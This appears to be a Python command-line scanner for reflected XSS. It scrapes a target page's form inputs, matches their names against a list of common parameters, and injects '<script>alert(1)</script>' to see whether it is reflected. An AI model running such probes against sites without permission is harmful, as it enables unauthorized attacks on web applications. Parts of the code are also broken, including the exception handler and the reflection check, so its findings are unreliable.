from bs4 import BeautifulSoup as bs, Tag
import requests as re
import json
import urllib.parse
import argparse
from colorama import init, Fore, Style, Back

payload = "<script>alert(1)</script>"
encoded_payload = urllib.parse.quote(payload)
#types = ["text", "password", "email", "url", "username"]
types = [  # common paramtere names to be bruteforced for parameter discovery
    'redirect', 'redir', 'url', 'link', 'goto', 'debug', '_debug', 'test', 'get', 'index', 'src', 'source', 'file',
    'frame', 'config', 'new', 'old', 'var', 'rurl', 'return_to', '_return', 'returl', 'last', 'text', 'load', 'email',
    'mail', 'user', 'username', 'password', 'pass', 'passwd', 'first_name', 'last_name', 'back', 'href', 'ref', 'data', 'input',
    'out', 'net', 'host', 'address', 'code', 'auth', 'userid', 'auth_token', 'token', 'error', 'keyword', 'key', 'q', 'query', 'aid',
    'bid', 'cid', 'did', 'eid', 'fid', 'gid', 'hid', 'iid', 'jid', 'kid', 'lid', 'mid', 'nid', 'oid', 'pid', 'qid', 'rid', 'sid',
    'tid', 'uid', 'vid', 'wid', 'xid', 'yid', 'zid', 'cal', 'country', 'x', 'y', 'topic', 'title', 'head', 'higher', 'lower', 'width',
    'height', 'add', 'result', 'log', 'demo', 'example', 'message', 'searchPhrase', 'content']
#param = {{types} : {payload}}
found_types = []
json_param = []
param = []

#processing command line args
parser = argparse.ArgumentParser()
parser.add_argument('-u', '--url', help='url', dest='target_url')
args = parser.parse_args()

target_url = args.target_url

init(autoreset=True)

def show_banner():
    print(Style.BRIGHT + Fore.CYAN + r"""
   _______  ___  ___  __    __       __       ___  ___   ________  ________  
  |   __ "\|"  \/"  |/" |  | "\     /""\     |"  \/"  | /"       )/"       ) 
  (. |__) :)\   \  /(:  (__)  :)   /    \     \   \  / (:   \___/(:   \___/  
  |:  ____/  \\  \/  \/      \/   /' /\  \     \\  \/   \___  \   \___  \    
  (|  /      /   /   //  __  \\  //  __'  \    /\.  \    __/  \\   __/  \\   
 /|__/ \    /   /   (:  (  )  :)/   /  \\  \  /  \   \  /" \   :) /" \   :)  
(_______)  |___/     \__|  |__/(___/    \___)|___/\___|(_______/ (_______/   
""")
    print(Style.BRIGHT + Fore.CYAN + "Made By Daddy_V")


def verify_inputs(url):
    response = re.get(url)

    input_fields = []
    soup = bs(response.text, "html.parser")
    forms = soup.find_all("form")
    for form in forms:
        input_fields = form.find_all("input")

    #found_types = []

    for input_field in input_fields:

        for attr_type in types:
            trueVals = (input_field.get('name') == attr_type) > 0

            if trueVals > 0:
                print("input fields found")
                found_types.append(attr_type)

        
def xss_payload(url, param):
    xss_req = re.get(url, params=param)
    print(xss_req.status_code)
    #print(xss_req.text)
    if encoded_payload in xss_req.text:
        print("[+] XSS payload successfully loaded")

try:
    show_banner()
    print("Checking for available input fields....")
    verify_inputs(f"{target_url}")

    print(found_types)

    for param in found_types:
        xss_payload(f"{target_url}", {param: encoded_payload})
except e :
    print(f"we found an execption: {e}")
